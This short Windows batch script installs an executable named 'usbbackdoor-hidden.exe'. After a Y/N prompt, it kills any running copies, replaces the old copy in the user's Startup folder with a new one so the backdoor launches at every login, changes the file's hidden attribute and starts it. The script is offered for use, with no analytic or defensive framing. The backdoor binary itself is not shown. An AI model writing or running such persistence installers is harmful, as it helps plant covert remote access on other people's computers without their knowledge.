@echo off
set /P c=Are you sure you want to install a usbbackdoor onto this pc?[Y/N]
if /I "%c%" EQU "Y" goto :yes
exit
:yes
taskkill /f /im usbbackdoor-hidden.exe
taskkill /f /im USBBAC~1.EXE
mkdir trash
powershell -c move $env:appdata'\Microsoft\Windows\Start Menu\Programs\Startup\usbbackdoor-hidden.exe' trash
powershell -c copy .\usbbackdoor-hidden.exe $env:appdata'\Microsoft\Windows\Start Menu\Programs\Startup'
attrib -H "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\usbbackdoor-hidden.exe"
start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\usbbackdoor-hidden.exe"
rmdir /s /q trash